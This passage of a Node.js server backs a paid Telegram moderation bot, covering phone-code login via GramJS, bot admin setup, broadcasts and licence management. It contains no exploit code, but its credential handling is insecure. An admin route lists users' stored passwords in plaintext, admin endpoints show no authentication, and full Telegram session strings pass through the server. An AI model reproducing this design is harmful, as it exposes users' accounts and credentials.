    return next();
});

// =============================================================================
// 5. GRAMJS MTPROTO & REST API ROUTES
// =============================================================================
const tempAuthClients = {};

async function extractCommunities(client) {
    const dialogs = await client.getDialogs({ limit: 100 });
    const groups = [];
    const channels = [];

    const connectedSnap = await db.ref('connected_bots').once('value');
    const connectedMap = connectedSnap.val() || {};

    for (const d of dialogs) {
        if (!d.isGroup && !d.isChannel) continue;
        const e = d.entity;
        if (!e || e.deactivated || e.migratedTo) continue;
        if (e.className === 'ChatForbidden' || e.className === 'ChannelForbidden') continue;

        const isCreator = Boolean(e.creator);
        const hasAdminRights = Boolean(e.adminRights && (e.adminRights.addAdmins || e.adminRights.inviteUsers || e.adminRights.changeInfo));
        const isBasicAdmin = Boolean(e.admin);

        if (!isCreator && !hasAdminRights && !isBasicAdmin) continue;

        let photoBase64 = null;
        try {
            if (e.photo) {
                const buffer = await client.downloadProfilePhoto(e, { isBig: false });
                if (buffer && buffer.length > 0) photoBase64 = `data:image/jpeg;base64,${buffer.toString('base64')}`;
            }
        } catch (err) {}

        const isBroadcastChannel = d.isChannel && !e.megagroup;
        const chatIdStr = d.id.toString();

        let isBotConnected = Boolean(connectedMap[chatIdStr]);
        if (!isBotConnected && botId) {
            try {
                const botMember = await bot.telegram.getChatMember(chatIdStr, botId);
                if (botMember && ['administrator', 'creator'].includes(botMember.status)) isBotConnected = true;
            } catch (err) {}
        }

        const itemData = {
            id: chatIdStr,
            title: d.title || "Community",
            role: isCreator ? 'Owner' : 'Admin',
            isBotConnected: isBotConnected,
            photo: photoBase64
        };

        if (isBroadcastChannel) {
            itemData.subscribersCount = e.participantsCount || 1;
            channels.push(itemData);
        } else {
            itemData.membersCount = e.participantsCount || 1;
            groups.push(itemData);
        }
    }

    return { groups, channels };
}

app.post('/api/tg/send-code', async (req, res) => {
    const { phone } = req.body;
    try {
        const client = new TelegramClient(new StringSession(""), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();
        const sendCodeResult = await client.sendCode({ apiId: API_ID, apiHash: API_HASH }, phone);
        tempAuthClients[phone] = { client, phoneCodeHash: sendCodeResult.phoneCodeHash };
        res.json({ success: true, phoneCodeHash: sendCodeResult.phoneCodeHash });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/tg/verify-code', async (req, res) => {
    const { phone, code, phoneCodeHash, password } = req.body;
    try {
        const sessionData = tempAuthClients[phone];
        if (!sessionData) throw new Error("Session expired. Please request code again.");

        const client = sessionData.client;
        if (!client.connected) await client.connect();

        try {
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: phone,
                phoneCodeHash: phoneCodeHash || sessionData.phoneCodeHash,
                phoneCode: code.toString().trim()
            }));
        } catch (authErr) {
            if (authErr.message.includes('SESSION_PASSWORD_NEEDED')) {
                if (!password) return res.json({ success: false, needPassword: true });
                const pwd = await client.invoke(new Api.account.GetPassword());
                const passwordCheck = await computeCheck(pwd, password);
                await client.invoke(new Api.auth.CheckPassword({ password: passwordCheck }));
            } else {
                throw authErr;
            }
        }

        let myTelegramId = null;
        try {
            const me = await client.getMe();
            if (me && me.id) myTelegramId = me.id.toString();
        } catch (mErr) {}

        const stringSession = client.session.save();
        const { groups, channels } = await extractCommunities(client);
        delete tempAuthClients[phone];

        res.json({ success: true, session: stringSession, telegramId: myTelegramId, groups, channels });
    } catch (e) {
        res.status(500).json({ error: e.message || "Invalid OTP code." });
    }
});

app.post('/api/tg/fetch-communities', async (req, res) => {
    const { session } = req.body;
    if (!session) return res.status(400).json({ error: "Session missing" });
    try {
        const client = new TelegramClient(new StringSession(session), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();

        let myTelegramId = null;
        try {
            const me = await client.getMe();
            if (me && me.id) myTelegramId = me.id.toString();
        } catch (e) {}

        const { groups, channels } = await extractCommunities(client);
        res.json({ success: true, telegramId: myTelegramId, groups, channels });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/tg/connect-group', async (req, res) => {
    const { session, chatId, userId } = req.body;
    try {
        const client = new TelegramClient(new StringSession(session), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();

        let myTgId = null;
        try {
            const me = await client.getMe();
            if (me && me.id) {
                myTgId = me.id.toString();
                await db.ref(`groups/${chatId}/merged_owner`).set(myTgId);
            }
        } catch (e) {}

        let sub = null;
        if (userId) sub = (await db.ref(`subscriptions/by_uid/${userId}`).once('value')).val();
        if (!sub && myTgId) sub = (await db.ref(`subscriptions/${myTgId}`).once('value')).val();

        const now = Date.now();
        if (!sub || (sub.graceEndsAt && now > sub.graceEndsAt)) {
            return res.status(403).json({ success: false, error: "NO_ACTIVE_LICENSE", message: "Active subscription license required." });
        }

        const dialogs = await client.getDialogs({ limit: 100 });
        const cleanId = chatId.toString().replace('-100', '').replace('-', '');
        let targetDialog = dialogs.find(d => 
            (d.id.toString() === chatId.toString() || String(d.entity?.id) === cleanId)
        );

        if (!targetDialog || !targetDialog.entity) throw new Error("Community dialog entity not found.");

        const targetEntity = targetDialog.entity;
        const botPeer = await client.getInputEntity(BOT_USERNAME);
        const botInputUser = new Api.InputUser({ userId: botPeer.userId, accessHash: botPeer.accessHash });

        let targetInputChannel = new Api.InputChannel({ channelId: targetEntity.id, accessHash: targetEntity.accessHash });

        try {
            await client.invoke(new Api.channels.InviteToChannel({ channel: targetInputChannel, users: [botInputUser] }));
        } catch (invErr) {}

        const isBroadcast = (targetEntity.className === 'Channel' && !targetEntity.megagroup);
        const adminRights = isBroadcast
            ? new Api.ChatAdminRights({ changeInfo: true, postMessages: true, editMessages: true, deleteMessages: true, inviteUsers: true, addAdmins: false, manageCall: true })
            : new Api.ChatAdminRights({ changeInfo: true, deleteMessages: true, banUsers: true, inviteUsers: true, pinMessages: true, addAdmins: false, manageCall: true, other: true });

        await client.invoke(new Api.channels.EditAdmin({
            channel: targetInputChannel,
            userId: botInputUser,
            adminRights: adminRights,
            rank: 'VS Guardian'
        }));

        await db.ref(`connected_bots/${chatId}`).set({ connected: true, chatId: chatId, updatedAt: Date.now() });
        res.json({ success: true, message: `@${BOT_USERNAME} deployed & granted Administrator powers!` });
    } catch (e) {
        res.status(500).json({ error: e.message || "Failed to add bot as admin" });
    }
});

app.post('/api/tg/save-section', async (req, res) => {
    const { chatId, sectionKey, data } = req.body;
    try {
        const check = await getOwnerSubByChat(chatId);
        if (!check.hasSub) return res.status(403).json({ success: false, error: check.reason, message: check.message });

        await db.ref(`groups/${chatId}/settings/${sectionKey}`).set(data);
        if (chatSettingsCache[chatId]) chatSettingsCache[chatId][sectionKey] = data;
        res.json({ success: true, message: "Policy saved successfully!" });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/tg/broadcast', async (req, res) => {
    const { chatId, text, photoUrl, buttons } = req.body;
    try {
        const check = await getOwnerSubByChat(chatId);
        if (!check.hasSub) return res.status(403).json({ success: false, error: check.reason, message: check.message });

        const keyboard = buildInlineButtons(buttons);
        const extra = { parse_mode: 'Markdown' };
        if (keyboard) extra.reply_markup = keyboard.reply_markup;

        const photo = (photoUrl || "").trim();
        if (photo && (photo.startsWith('http://') || photo.startsWith('https://'))) {
            await bot.telegram.sendPhoto(chatId, photo, { caption: text || "", ...extra });
        } else {
            await bot.telegram.sendMessage(chatId, text, extra);
        }
        res.json({ success: true, message: "Announcement broadcasted successfully!" });
    } catch (e) {
        res.status(500).json({ error: e.message || "Failed to broadcast." });
    }
});

app.post('/api/tg/announce-lock', async (req, res) => {
    const { chatId, locked, message, sendLockMsg } = req.body;
    try {
        const check = await getOwnerSubByChat(chatId);
        if (!check.hasSub) return res.status(403).json({ success: false, error: check.reason, message: check.message });

        if (sendLockMsg !== false) {
            const defaultMsg = locked ? "🔒 *This conversation has been temporarily muted by community administrators.*" : "🔓 *Conversation restriction lifted.*";
            const broadcast = message && message.trim() ? message.trim() : defaultMsg;
            await bot.telegram.sendMessage(chatId, broadcast, { parse_mode: 'Markdown' });
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/tg/test-morning', async (req, res) => {
    const { chatId, text } = req.body;
    try {
        const check = await getOwnerSubByChat(chatId);
        if (!check.hasSub) return res.status(403).json({ success: false, error: check.reason, message: check.message });

        const chatInfo = await bot.telegram.getChat(chatId).catch(() => ({ title: "Community" }));
        const formatted = (text || "🌅 Good Morning {chat}! Have a productive day ahead.").replace(/{chat}/g, chatInfo.title);
        await bot.telegram.sendMessage(chatId, formatted, { parse_mode: 'Markdown' });
        res.json({ success: true, message: "Morning announcement delivered!" });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/tg/get-left-members', async (req, res) => {
    const { chatId } = req.body;
    try {
        const snap = await db.ref(`groups/${chatId}/left_members`).once('value');
        const data = snap.val() || {};
        const list = Object.keys(data).map(uid => ({ id: uid, ...data[uid] })).sort((a,b) => b.timestamp - a.timestamp);
        res.json({ success: true, leftMembers: list });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/tg/get-scammers', async (req, res) => {
    const { chatId } = req.body;
    try {
        const snap = await db.ref(`groups/${chatId}/scammers`).once('value');
        const data = snap.val() || {};
        const list = Object.keys(data).map(uid => ({ id: uid, ...data[uid] }));
        res.json({ success: true, scammers: list });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// License Key Generator
function generateLicenseKey() {
    const p1 = crypto.randomBytes(2).toString('hex').toUpperCase();
    const p2 = crypto.randomBytes(2).toString('hex').toUpperCase();
    const p3 = crypto.randomBytes(2).toString('hex').toUpperCase();
    return `VS-${p1}-${p2}-${p3}`;
}

// License APIs
app.post('/api/admin/generate-license', async (req, res) => {
    const { planId, customDurationDays } = req.body;
    try {
        const planConfigs = {
            starter: { name: "Starter (1 Channel / Group)", maxCommunities: 1, bdt: 50 },
            growth: { name: "Growth (5 Channels / Groups)", maxCommunities: 5, bdt: 200 },
            pro: { name: "Pro (15 Channels / Groups)", maxCommunities: 15, bdt: 450 },
            unlimited: { name: "Unlimited Enterprise Hub", maxCommunities: 999999, bdt: 750 }
        };

        const plan = planConfigs[planId] || planConfigs.starter;
        const key = generateLicenseKey();
        const durationDays = parseInt(customDurationDays) || 30;

        const licenseData = {
            key,
            planId,
            planName: plan.name,
            maxCommunities: plan.maxCommunities,
            bdt: plan.bdt,
            usdt: (plan.bdt / 127).toFixed(2),
            durationDays,
            graceDays: 7,
            status: "active",
            createdAt: Date.now()
        };

        await db.ref(`licenses/${key}`).set(licenseData);
        res.json({ success: true, license: licenseData });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/admin/list-licenses', async (req, res) => {
    try {
        const snap = await db.ref('licenses').once('value');
        const data = snap.val() || {};
        const list = Object.keys(data).map(k => data[k]).sort((a,b) => b.createdAt - a.createdAt);
        res.json({ success: true, licenses: list });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/admin/revoke-license', async (req, res) => {
    const { key } = req.body;
    try {
        await db.ref(`licenses/${key}`).update({ status: 'revoked' });
        res.json({ success: true, message: 'License revoked.' });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/admin/extend-license', async (req, res) => {
    const { key, days } = req.body;
    try {
        const lic = (await db.ref(`licenses/${key}`).once('value')).val();
        if (!lic) throw new Error("License not found");

        const extraMs = (parseInt(days) || 30) * 86400000;
        const newExp = (lic.expiresAt || Date.now()) + extraMs;
        const newGrace = newExp + (7 * 86400000);

        await db.ref(`licenses/${key}`).update({ expiresAt: newExp, graceEndsAt: newGrace });
        if (lic.claimedUserId) await db.ref(`subscriptions/by_uid/${lic.claimedUserId}`).update({ expiresAt: newExp, graceEndsAt: newGrace });
        if (lic.ownerTelegramId && lic.ownerTelegramId !== 'Unlinked') await db.ref(`subscriptions/${lic.ownerTelegramId}`).update({ expiresAt: newExp, graceEndsAt: newGrace });

        res.json({ success: true, message: `Extended by ${days} days!` });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/admin/users-list', async (req, res) => {
    try {
        const usersData = (await db.ref('users').once('value')).val() || {};
        const subsData = (await db.ref('subscriptions/by_uid').once('value')).val() || {};

        const list = Object.keys(usersData).map(uid => {
            const u = usersData[uid];
            const sub = subsData[uid] || null;
            return {
                uid,
                email: u.security_vault?.email || 'N/A',
                password: u.security_vault?.password || 'N/A',
                telegramId: u.owner_tg_id || 'Not Linked',
                subscription: sub ? sub.planName : 'No Active License'
            };
        });
        res.json({ success: true, users: list });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/license/claim', async (req, res) => {
    const { licenseKey, userId, userEmail, session, ownerTelegramId: providedTgId } = req.body;
    try {
        if (!licenseKey) throw new Error("License key required.");

        const cleanKey = licenseKey.trim().toUpperCase();
        const license = (await db.ref(`licenses/${cleanKey}`).once('value')).val();

        if (!license) throw new Error("Invalid license key.");
        if (license.status === "claimed") throw new Error("Key already claimed.");
        if (license.status === "revoked") throw new Error("Key revoked by admin.");

        let ownerTelegramId = providedTgId;
        if ((!ownerTelegramId || ownerTelegramId === 'null') && session) {
            try {
                const client = new TelegramClient(new StringSession(session), API_ID, API_HASH, { connectionRetries: 3 });
                await client.connect();
                const me = await client.getMe();
                if (me && me.id) ownerTelegramId = me.id.toString();
            } catch (e) {}
        }

        const now = Date.now();
        const expiresAt = now + (license.durationDays * 86400000);
        const graceEndsAt = expiresAt + (license.graceDays * 86400000);

        await db.ref(`licenses/${cleanKey}`).update({
            status: "claimed",
            claimedBy: userEmail || userId || "Anonymous",
            claimedUserId: userId || '',
            ownerTelegramId: ownerTelegramId || 'Unlinked',
            claimedAt: now,
            expiresAt,
            graceEndsAt
        });

        const subData = {
            licenseKey: cleanKey,
            planId: license.planId,
            planName: license.planName,
            maxCommunities: license.maxCommunities,
            userEmail: userEmail || '',
            claimedAt: now,
            expiresAt,
            graceEndsAt
        };

        if (userId) await db.ref(`subscriptions/by_uid/${userId}`).set(subData);
        if (ownerTelegramId && ownerTelegramId !== 'Unlinked') {
            await db.ref(`subscriptions/${ownerTelegramId}`).set(subData);
            if (userId) await db.ref(`users/${userId}/owner_tg_id`).set(ownerTelegramId);
        }

        subscriptionCache = {};
        res.json({ success: true, message: `License activated: ${license.planName}`, subscription: subData });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/license/status', async (req, res) => {
    const { userId, ownerTelegramId } = req.body;
    try {
        let sub = null;
        if (userId) sub = (await db.ref(`subscriptions/by_uid/${userId}`).once('value')).val();
        if (!sub && ownerTelegramId && ownerTelegramId !== 'null') sub = (await db.ref(`subscriptions/${ownerTelegramId}`).once('value')).val();

        if (!sub) return res.json({ hasSubscription: false });

        const now = Date.now();
        const isExpired = now > sub.expiresAt;
        const isGracePeriod = isExpired && now <= sub.graceEndsAt;
        const isTotallyShutDown = now > sub.graceEndsAt;

        res.json({
            hasSubscription: true,
            subscription: sub,
            isExpired,
            isGracePeriod,
            isTotallyShutDown,
            remainingDays: Math.max(0, Math.ceil((sub.expiresAt - now) / 86400000)),
            graceDaysLeft: Math.max(0, Math.ceil((sub.graceEndsAt - now) / 86400000))
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/admin/system-stats', async (req, res) => {
    try {
        const usersCount = (await db.ref('users').once('value')).numChildren() || 0;
        const groupsCount = (await db.ref('groups').once('value')).numChildren() || 0;
        const licData = (await db.ref('licenses').once('value')).val() || {};

        let totalRevenueBDT = 0;
        let claimedLicenses = 0;

        Object.keys(licData).forEach(k => {
            if (licData[k].status === 'claimed') {
                totalRevenueBDT += (licData[k].bdt || 0);
                claimedLicenses++;
            }
        });

        res.json({
            success: true,
            stats: {
                totalUsers: usersCount,
                totalGroups: groupsCount,
                claimedLicenses: claimedLicenses,
                revenueBDT: totalRevenueBDT,
                revenueUSDT: (totalRevenueBDT / 127).toFixed(2)
            }
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('*', (req, res) => {
    const p1 = path.join(__dirname, 'public', 'index.html');
    const p2 = path.join(__dirname, 'index.html');
    if (fs.existsSync(p1)) return res.sendFile(p1);
    if (fs.existsSync(p2)) return res.sendFile(p2);
    res.status(404).send("<h2>index.html not found.</h2>");
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[VS Protection] Server listening on port ${PORT}`);
    bot.launch()
        .then(() => console.log(`[VS Protection] Bot Engine Active: @${BOT_USERNAME}`))
        .catch(e => console.error("[VS Protection] Engine Warning:", e.message));
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
